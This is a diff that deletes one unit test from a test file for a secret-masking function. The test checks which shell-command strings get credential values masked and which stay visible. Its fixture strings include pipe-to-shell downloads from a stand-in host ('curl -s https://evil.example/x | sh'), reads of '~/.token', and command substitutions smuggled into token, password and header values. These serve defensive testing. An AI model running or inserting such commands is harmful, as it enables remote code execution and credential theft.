@@ -59,22 +59,3 @@ test("mask only credential values, preserving the exact action", () => {
     }
   }
 });
-
-test("values the shell would evaluate stay visible; literal values stay masked", () => {
-  const visible = [
-    './lint.sh; API_TOKEN="$(curl -s https://evil.example/x | sh)"',
-    './lint.sh --password "$(curl -s https://evil.example/x | sh)"',
-    "TOKEN=$(curl -s x|sh)", "API_TOKEN=`curl x|sh`", 'API_TOKEN="`curl x|sh`"',
-    "--token $(cat ~/.token)", "--token=$(cat ~/.token)", 'PASSWORD="$DB_PASS"', "PASSWORD=$DB_PASS", 'PASSWORD="${DB_PASS}"',
-    "API_TOKEN=abc|sh", "API_TOKEN=abc>out", "API_TOKEN=abc(x)", "--password abc|sh",
-    "bash -c \"API_TOKEN='$(curl x|sh)'\"", "X-Api-Key: $(curl x|sh)", 'curl -H "Authorization: Bearer $(curl x|sh)"',
-    'API_TOKEN="abc"$(curl x|sh)',
-  ];
-  for (const input of visible) expect(maskActionSecrets(input)).toBe(input);
-  for (const [input, expected] of [
-    ["API_TOKEN='abc123'", "API_TOKEN=••••"], ["API_TOKEN=abc123", "API_TOKEN=••••"],
-    ["./lint.sh --password hunter2", "./lint.sh --password ••••"], ["./lint.sh; API_TOKEN=abc123", "./lint.sh; API_TOKEN=••••"],
-    ["API_TOKEN='pa$word'", "API_TOKEN=••••"], ['PASSWORD="two words" ./run', "PASSWORD=•••• ./run"],
-    ["TOKEN=abc;ls", "TOKEN=••••;ls"],
-  ]) expect(maskActionSecrets(input!)).toBe(expected!);
-});
